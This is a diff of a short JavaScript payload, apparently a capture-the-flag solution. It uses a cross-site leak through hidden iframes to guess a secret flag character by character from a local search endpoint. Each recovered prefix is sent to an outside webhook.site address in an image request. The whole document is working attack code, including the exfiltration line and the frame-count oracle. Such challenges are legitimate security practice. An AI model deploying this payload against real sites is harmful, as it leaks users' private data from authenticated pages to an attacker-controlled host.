@@ -1,25 +1,25 @@
 <script>
 (async () => {
-    let flag = "REh7"; 
-    flag = atob(flag);
-    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f"; 
+    let currentB64 = "REh7";
+    let flag = atob(currentB64); 
+    
+    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
+    const iframe = document.createElement("iframe");
+    
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
 
     while (!flag.includes("}")) {
         for (let c of "0123456789abcdef}") {
-            let fr = document.createElement("iframe");
-            fr.style.display = "none";
-            document.body.appendChild(fr);
-
-            await new Promise(next => {
-                fr.onload = () => {
-                    if (fr.contentWindow.frames.length) {
+            await new Promise(resolve => {
+                iframe.onload = () => {
+                    if (iframe.contentWindow.frames.length > 0) {
                         flag += c;
                         new Image().src = `${webhook}?d=${btoa(flag)}`;
                     }
-                    fr.remove();
-                    next();
+                    resolve();
                 };
-                fr.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
+                iframe.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
             });
             if (flag.endsWith(c)) break;
         }
